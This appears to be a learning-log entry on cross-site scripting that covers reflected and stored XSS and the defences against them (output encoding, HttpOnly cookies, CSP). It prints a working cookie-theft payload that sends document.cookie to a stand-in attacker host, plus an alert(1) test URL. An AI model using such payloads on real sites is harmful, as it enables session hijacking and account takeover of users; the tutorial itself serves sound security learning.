## 🗓️ Day 40/100 – Cross-Site Scripting (XSS)

**Focus:** Exploiting client-side script execution to steal sessions and manipulate user actions.

### 🎭 What is XSS?
Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by other users. The script executes within the context of the victim's session.

### ⚔️ Attack Techniques

**1. Session Stealing (Cookie Theft)**
*   **Payload:**
    ```javascript
    <script>location.href='http://attacker.com/steal.php?cookie='+document.cookie</script>
    ```
*   **Impact:** Attacker obtains the Session ID and can impersonate the victim without credentials.

**2. Reflected XSS**
*   **Scenario:** Search bar reflects input.
*   **URL:** `http://target.com/search?q=<script>alert(1)</script>`
*   **Result:** Popup executes immediately.

**3. Stored XSS**
*   **Scenario:** Comment section or Profile Bio.
*   **Action:** Input payload into the database.
*   **Result:** Every user (including Admin) who views the profile executes the script.

### 🛡️ Defense Mechanisms
*   **Output Encoding:** Convert special characters into HTML entities (e.g., `<` becomes `&lt;`).
*   **HttpOnly Cookies:** Prevent JavaScript from accessing sensitive cookies (`document.cookie` returns empty).
*   **CSP (Content Security Policy):** A browser mitigation that strictly controls script sources.

**Day 40 Takeaway:** XSS turns the user's browser against them. Preventing it requires rigorous separation of data and code in the browser.
